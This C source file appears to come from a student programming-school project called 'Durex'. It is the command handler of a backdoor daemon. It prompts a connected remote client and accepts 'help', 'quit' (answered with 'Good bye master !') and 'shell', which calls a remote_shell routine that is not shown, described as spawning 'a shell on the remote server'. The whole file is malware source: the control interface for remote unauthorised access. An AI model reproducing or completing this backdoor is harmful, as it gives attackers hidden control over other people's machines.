/* ************************************************************************** */
/*                                                                            */
/*                                                        :::      ::::::::   */
/*   entry.c                                            :+:      :+:    :+:   */
/*                                                    +:+ +:+         +:+     */
/*   By: frmarinh <frmarinh@student.42.fr>          +#+  +:+       +#+        */
/*                                                +#+#+#+#+#+   +#+           */
/*   Created: 2017/10/17 21:10:05 by frmarinh          #+#    #+#             */
/*   Updated: 2017/10/17 21:10:11 by frmarinh         ###   ########.fr       */
/*                                                                            */
/* ************************************************************************** */

#include "all.h"

/*
**	Prompt print between every client message
*/
void		print_prompt(t_client *client, bool new_line)
{
	char	prompt[16];

	snprintf(prompt, 15, (new_line) ? "\n$> " : "$> ");
	send(client->socket, (char*)&prompt, ft_strlen(prompt), 0);
}

/*
**	Handler for the client entries
*/
void			entry_handler(t_client *client, char *entry, bool line)
{
	if (!ft_strcmp(entry, "help")) {
		char help_message[] = "shell - Spawn a shell on the remote server\nquit - Exit and close Durex\n";
		send(client->socket, (char*)&help_message, ft_strlen((char*)&help_message), 0);
	} else if (!ft_strcmp(entry, "quit")) {
		char leave_message[] = "Good bye master !\n";
		send(client->socket, (char*)&leave_message, ft_strlen((char*)&leave_message), 0);
		exit(0);
	} else if (!ft_strcmp(entry, "shell")) {
		remote_shell(client);
	}
	print_prompt(client, (line) ? false : true);
}
